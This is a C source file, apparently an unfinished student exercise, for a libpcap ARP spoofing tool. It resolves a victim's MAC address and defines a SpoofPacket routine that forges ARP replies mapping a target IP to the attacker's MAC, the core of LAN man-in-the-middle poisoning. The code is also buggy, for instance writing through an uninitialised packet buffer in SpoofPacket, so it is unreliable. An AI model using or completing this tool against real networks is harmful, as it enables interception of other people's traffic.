#include <stdio.h>
#include <unistd.h>
#include <pcap/pcap.h>
#include <net/ethernet.h>   /*  for struct ether_header */
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>  /* for inet_pton */
#include <string.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdlib.h>

int GetMyIP(struct in_addr* MyIP, char* dev);
int GetMyMac(struct ether_addr* MyMac, char* dev);
int GetSenderMac(pcap_t *handle, struct ether_addr MyMac, struct in_addr MyIP, struct in_addr SenderIP, struct ether_addr* SMac);
int GenArpPacket(struct ether_addr DMac, struct ether_addr SMac, uint16_t OpCode, struct in_addr SenderIP,struct ether_addr SenderMac, struct in_addr TargetIP, struct ether_addr TargetMac, char** packet, int* size);
int SpoofPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr MyMac, struct in_addr TargetIP, struct in_addr SenderIP);

int main(int argc, char** argv){
    pcap_t *handle;   /* Session handle */
    char *dev;  /* device to communication */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    bpf_u_int32 net;
    bpf_u_int32 mask;
    struct ether_addr MyMac;   /* my mac address */
    struct ether_addr SenderMac;
    struct in_addr MyIP, SenderIP, TargetIP;
    /* Check argument count */
    if(argc != 4){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    if(inet_pton(AF_INET, argv[2], &SenderIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    if(inet_pton(AF_INET, argv[3], &TargetIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    /* Define device */
    dev = argv[1];

    printf("**********************************\n");
    printf("Spoofing Program Start!!\n");
    printf("Interface is %s\n",dev);
    printf("Sender IP is %s\n",inet_ntoa(SenderIP));
    printf("Target IP is %s\n",inet_ntoa(TargetIP));

    /* Open session in promiscuous mode */
    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }
    /* Get My IP addr */
    if(GetMyIP(&MyIP, dev)){
        fprintf(stderr, "Couldn't get IPv4\n");
        return 2;
    }

    printf("My IP is %s\n",inet_ntoa(MyIP));

    printf("**********************************\n");
    printf("Get Local Mac Address...\n");
    if(GetMyMac(&MyMac, dev) != 1){
        fprintf(stderr, "Couldn't Get local Mac Address\n");
        return 2;
    }
    printf("Success!!\n");
    printf("Local Mac Address is %s\n",ether_ntoa(&MyMac));

    printf("**********************************\n");
    printf("Get Sender Mac Address...\n");
    GetSenderMac(handle, MyMac, MyIP, SenderIP,&SenderMac);
    //SpoofPacket(handle,SenderMac,MyMac,TargetIP,SenderIP);
    return 0;
}

/* Ref: https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program */
int GetMyMac(struct ether_addr* MyMac, char* dev){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
        memcpy(MyMac, s.ifr_addr.sa_data, ETHER_ADDR_LEN);
        return 1;
    }
    return 0;
}

/* Ref: https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux */
int GetMyIP(struct in_addr* MyIP, char* dev){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    /* display result */
    memcpy(MyIP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IPVERSION);

    return 0;
}

int GetSenderMac(pcap_t* handle, struct ether_addr MyMac, struct in_addr MyIP, struct in_addr SenderIP, struct ether_addr* SMac){
    struct ether_addr BroadcastMac;
    struct ether_addr UnknownMac;
    char *packet = (char *)malloc(ETHER_MAX_LEN);
    int size;
    /* broadcast request packet */
    printf("Generate Request packet to ask who is %s\n",inet_ntoa(SenderIP));

    memcpy(&BroadcastMac, "\xFF\xFF\xFF\xFF\xFF\xFF",ETHER_ADDR_LEN);
    memcpy(&UnknownMac, "\x00\x00\x00\x00\x00\x00",ETHER_ADDR_LEN);
    if(GenArpPacket(BroadcastMac, MyMac, ARPOP_REQUEST, MyIP, MyMac, SenderIP, UnknownMac, &packet, &size) != 1){
        fprintf(stderr, "Couldn't Generate Arp Packet\n");
        return 0;
    }
    /* parsing sniffed packet */
    pcap_sendpacket(handle, packet, size);


    free(packet);
    return 1;
}



int GenArpPacket(struct ether_addr DMac, struct ether_addr SMac, uint16_t OpCode, struct in_addr SenderIP,struct ether_addr SenderMac, struct in_addr TargetIP, struct ether_addr TargetMac, char** packet, int* size){
    struct ether_header eth_hdr;
    struct arphdr arp_hdr;
    uint32_t offset = 0;

    memcpy(eth_hdr.ether_dhost, &DMac, ETH_ALEN);
    memcpy(eth_hdr.ether_shost, &SMac, ETH_ALEN);
    eth_hdr.ether_type = htons(ETHERTYPE_ARP);

    arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_hdr.ar_pln = IPVERSION;     /* is same with IP ADDR LEN */
    arp_hdr.ar_op = htons(OpCode);

    *size = sizeof(struct ether_header) + sizeof(struct arphdr) + 2 * ETHER_ADDR_LEN + 2*IPVERSION;
    memcpy(*packet + offset, &eth_hdr, sizeof(struct ether_header));
    offset += sizeof(struct ether_header);
    memcpy(*packet + offset, &arp_hdr, sizeof(struct arphdr));
    offset += sizeof(struct arphdr);
    memcpy(*packet + offset, &SenderMac, ETHER_ADDR_LEN);
    offset += ETHER_ADDR_LEN;
    memcpy(*packet + offset, &SenderIP, IPVERSION);
    offset += IPVERSION;
    memcpy(*packet + offset, &TargetMac, ETHER_ADDR_LEN);
    offset += ETHER_ADDR_LEN;
    memcpy(*packet + offset, &TargetIP, IPVERSION);
    
    /* for debug */
    printf("size : %d\n",*size);
    int i;
    for(i=0;i<*size;i++){
        printf("%02x ",((char*)(*packet))[i]);
    }
    return 1;
}

int SpoofPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr MyMac, struct in_addr TargetIP, struct in_addr SenderIP){
    char *packet;
    int size;
    GenArpPacket(SenderMac,MyMac,ARPOP_REPLY,TargetIP,MyMac,SenderIP,SenderMac,&packet,&size);
    pcap_sendpacket(handle,packet,size);
    return 1;
}
